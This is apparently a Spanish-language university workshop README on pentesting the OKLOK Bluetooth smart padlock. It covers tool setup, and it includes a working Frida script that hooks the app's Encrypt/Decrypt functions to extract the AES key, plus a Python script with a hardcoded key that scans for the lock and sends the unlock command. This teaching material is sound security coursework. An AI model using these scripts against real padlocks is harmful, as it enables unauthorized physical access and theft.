# Pentest candado Bluetooth OKLOK

El objetivo de este Test de Penetración (Pentest) consiste en ver si somos capaces de **encontrar la clave de desbloqueo** de un candado inteligente para poder **abrirlo** mediante conexión **bluetooth** sin permiso del usuario.


<p align="center">
<img src="oklok.png"  width="60%" height="30%">
</p>

El candado objetivo, modelo **OKLOK Padlock**, es un candado que se puede desbloquear mediante huella digital y usando una [App Android](https://play.google.com/store/apps/details?id=com.oklok.lock&hl=en&gl=US) diseñada para tal efecto. 

Las versiones antiguas del candado tienen una vulnerabilidad conocida y documentada ([TFM Jesus Alberto Tejedor Doria, 2020](https://eprints.ucm.es/62476/1/JESUS_ALBERTO_TEJEDOR_DORIA_Entrega_Final_TFM_Pentesting_Device_IoT_Smart_Doorlock_4286353_1929042718.pdf), basado en [Attify Pentest kit](https://www.attify.com/iot-security-pentesting)) que permitía **averiguar la clave** de desbloqueo de una manera relativamente sencilla. Sin embargo, el fabricante ha **actualizado la aplicación de Android**, complicando la obtención de dicha clave.

El objetivo de este taller consiste en ser capaces de encontrar la clave de acceso mediante el estudio e instrumentación de la nueva aplicación. Para ello os explicaré cómo se conseguía la clave usando la aplicación antigua ([M-IoT S&L P2: Pentest_Lock](Pentest_Lock.pdf)), con la esperanza de que algún hacker sea capaz de obtener claves nuevas de los candados que tenemos en la FDI y así poder volver a utilizar la práctica dentro de la asignatura Seguridad y Legalidad del Máster de IoT. 

# Material necesario

Para intentar replicar el hack necesitaremos un ordenador con Linux instalado y un dispositivo Android *rooteado*. Para facilitar la tarea os dejo una imagen de una máquina virtual de **Ubuntu Mate** y una imagen de **Android para Raspberry Pi 4**.

## VirtualBox Ubuntu Mate 18.04 64b

En este enlace  [Ubuntu Mate 18.04.1 64b](https://drive.google.com/file/d/1eo9bX2aVQekpQcAm2UmuF1QA5-_ZrvyT/view?usp=share_link) os dejo una MV preparada con todo lo que listo a continuación. Para poder descargar el fichero deberéis de estar **identificados** con la cuenta de correo de la **UCM**.

- Usuario/contraseña: `master_iot`/`SyL`

- Paquetes instalados sobre la versión *stock*:

```bash
sudo apt-get install ubertooth
sudo apt-get install python-pip libglib2.0-dev python-dev
sudo pip install bluepy
sudo pip install pycrypto
sudo pip install pyaes
sudo apt install aapt
sudo apt install apktool
sudo apt install zipalign
sudo apt install python3-pip
sudo pip3 install objection
sudo apt install adb 
sudo apt install default-jdk
```

* Acceso a unidades compartidas con el Host:

```bash
sudo adduser masteriot vboxsf
```

* La versión de `apk-tool` del repositorio (*v.v2.4.0-dirty*) no parece valerle a `objection`: **Error** *apktool version should be at least 2.4.1*.
  Copiamos [apk-tool v2.4.1](https://ibotpeaches.github.io/Apktool/install/) en `~/bin` y mantenemos el paquete, ya que instala algo necesario (no he localizado el qué).

* [*Wireshark* actualizado](https://launchpad.net/~wireshark-dev/+archive/ubuntu/stable) y sin privilegios (requiere `logout`). Wireshark permite monitorizar la red del Host si se configura en modo `bridged` y con la configuración `Promiscuous mode: Allow all.`

```bash
sudo add-apt-repository ppa:wireshark-dev/stable
sudo apt-get update
sudo apt-get install wireshark
sudo dpkg-reconfigure wireshark-common
sudo addgroup masteriot wireshark
```

* [Bettercap](https://www.bettercap.org/):
    - Descargar y copiar el binario precompilado en `/sbin/`, necesita librerías
* [Jadx](https://github.com/skylot/jadx):
    - Descargar y copiar en `/opt/jadx-1.1.0`
    - **Nota:** este programa consume muchos recursos, asignar 4GiB y 2 CPUs en la MV

```bash
sudo apt-get install libpcap-dev libnetfilter-queue-dev
```

## Raspberry Pi Android 9 (LineageOS 16.0)

* Enlace a la imagen original [LineageOS 16.0](https://drive.google.com/file/d/1FepSgPTNmIe9RXJRf8kPZBdfw4rda9RY/view?usp=share_link). Para poder descargar el fichero deberéis de estar **identificados** con la cuenta de correo de la **UCM**.
* Manual: [LineageOS 16.0 (Android 9)](https://konstakang.com/devices/rpi3/LineageOS16.0/)
* Necesario conectar un monitor HDMI sin adaptador, o configurar a mano la resolución según manual.
* Pasos del manual necesarios:
    * Habilitar opciones de desarrollador
    * Habilitar acceso de *root*
* Otras consideraciones:
    * Botón de apagado: F5
    * Es necesario activar *adb* por red
    * Habilitar log bluetooth
* Servidor frida:  [frida-server-14.2.8-android-arm](frida-server-14.2.8-android-arm) 

## Apks y utilidades

Os dejo dos versiones antiguas de la **App Oklok** que no están muy ofuscadas:
*  [oklok_v1.3.0.apk](oklok_v1.3.0.apk) 
*  [oklok_v1.5.7.apk](oklok_v1.5.7.apk) 

Script para **conseguir la clave** mediante Frida:

```java
Java.perform(function () 
{
    var CMDUtils = Java.use('com.coolu.blelibrary.utils.CMDUtils');

    var log_byte_array = function (arr) {
        var result = "";
        var buffer = Java.array('byte', arr);
        for(var i = 0; i < buffer.length; ++i)  {
            var hexb = (buffer[i] & 0xFF).toString(16);
            if (hexb.length == 1) hexb = '0' + hexb;
            result += hexb;
        }
        console.log(result);
    };

    CMDUtils.Encrypt.implementation = function (pt, key) {
        console.log('[+] Inside Encrypt()  ======');
        var ct = this.Encrypt(pt, key);
        console.log('Pt:')
        log_byte_array(pt)
        console.log('key:')
        log_byte_array(key);
        return ct;
    };

    CMDUtils.Decrypt.implementation = function (ct, key) {
        console.log('[+] Inside Decrypt()  ======');
        var pt = this.Decrypt(ct, key);
        console.log('Pt:')
        log_byte_array(pt)
        console.log('Key:')
        log_byte_array(key);
        return pt;
    };
});
```

Script **Python 2** para abrir el candado (una vez que **conocemos la clave AES**):

```python
from bluepy.btle import Scanner, Peripheral, DefaultDelegate
from Crypto.Cipher import AES

AESKEY = '034100624f0a29355c193f1a39192356'
           
class MyDelegate(DefaultDelegate):
    def __init__(self):
        DefaultDelegate.__init__(self)
        self.token = None
    def handleNotification(self, cHandle, data):
        cipher = AES.new(AESKEY.decode('hex'), AES.MODE_ECB)
        pt = cipher.decrypt(data)
        
        if pt.startswith('\x06\x02\x07'):
            self.token = pt[3:7]
            print '[+] Token:', self.token.encode('hex')
def connect(addr):
    print '[+] Connecting'
    p = Peripheral(addr)

    write_char = p.getCharacteristics(uuid='000036f5-0000-1000-8000-00805f9b34fb')[0]
    notify_char = p.getCharacteristics(uuid='000036f6-0000-1000-8000-00805f9b34fb')[0]  

    # Enable notifications, https://stackoverflow.com/a/15722811
    p.writeCharacteristic(7, '0100'.decode('hex'), withResponse=True)

    d = MyDelegate()
    p.withDelegate(d)

    gettokencmd = '06010101' + '0'*24
    gettokstr = AES.new(AESKEY.decode('hex'), AES.MODE_ECB).encrypt(gettokencmd.decode('hex'))
    
    print '[+] Sending GET_TOKEN command'
    write_char.write(gettokstr, withResponse=True)
    
    p.waitForNotifications(2)

    if d.token != None:
        cipher = AES.new(AESKEY.decode('hex'), AES.MODE_ECB)
    
        # Send unlock command
        pt = '050106303030303030'.decode('hex') + d.token + '\x00\x00\x00'      
        write_char.write(cipher.encrypt(pt))
        print '[+] Sent unlock command'
def main():
    s = Scanner()
    print '[+] Scanning for 5s...'
    s.scan(5)

    for dev in s.getDevices():  
        if dev.getValueText(0x9) == 'BlueFPL':
            print '[+] Found OKLOK'
            connect(dev.addr)
            break            
if __name__ == '__main__':
    main()
```

